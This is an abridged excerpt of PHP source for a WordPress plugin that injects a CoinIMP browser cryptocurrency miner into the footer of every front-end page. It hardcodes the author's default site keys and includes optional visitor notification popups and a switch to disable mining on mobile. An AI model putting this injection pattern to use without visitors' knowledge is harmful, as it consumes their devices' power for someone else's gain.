...
class CoinIMPMinerPlugin
{
    ...
    function admin_init()
    {
        ...
        update_option('coinimp_currencies', array('xmr','web',));
        register_setting('coinimp-miner-script-installer', 'coinimp_defaultsitekeys');
        update_option('coinimp_defaultsitekeys', array('040adc234b5f87256ab804fe2aaa97aa7b611eeea061d1291f4f7e6e90f6279f','b85868f39d3b870162458fb36a628af1fdb3e0ae4228f1fcdca43d44a59679c8',));
        if (!get_option('coinimp_previousSiteKeys')) {
            register_setting('coinimp-miner-script-installer', 'coinimp_previousSiteKeys');
            update_option('coinimp_previousSiteKeys', array('040adc234b5f87256ab804fe2aaa97aa7b611eeea061d1291f4f7e6e90f6279f','b85868f39d3b870162458fb36a628af1fdb3e0ae4228f1fcdca43d44a59679c8',));
        }
    ...
    function wp_footer()
    {
        if (!is_admin() && !is_feed() && !is_robots() && !is_trackback()) {
            if (!get_option('coinimp_disable') == "Disabled") {
                ...
                if (get_option('coinimp_currentcurrency') == 0) {
                    $script = str_replace("@currencymodifier", "", $script);
                } else {
    ...
    private function prepareFloatingNotification()
    {
        ...
        if (get_option('coinimp_runonmobile') == "Disabled") {
            $floatingNotification .= PHP_EOL . '<script> if(_client.isMobile()) document.getElementById("minernotify").style.display="none"; </script>';
        }
        $floatingNotification = str_replace(
            "@BackColor",
    ...
    private function preparePopupNotification()
    {
        ...
        if (get_option('coinimp_runonmobile') == "Disabled") {
            $popup = str_replace(
                '<script>',
                '<script>' . PHP_EOL . 'if(! _client.isMobile()) {',
                $popup
            );
            $popup = str_replace(
                '</script>',
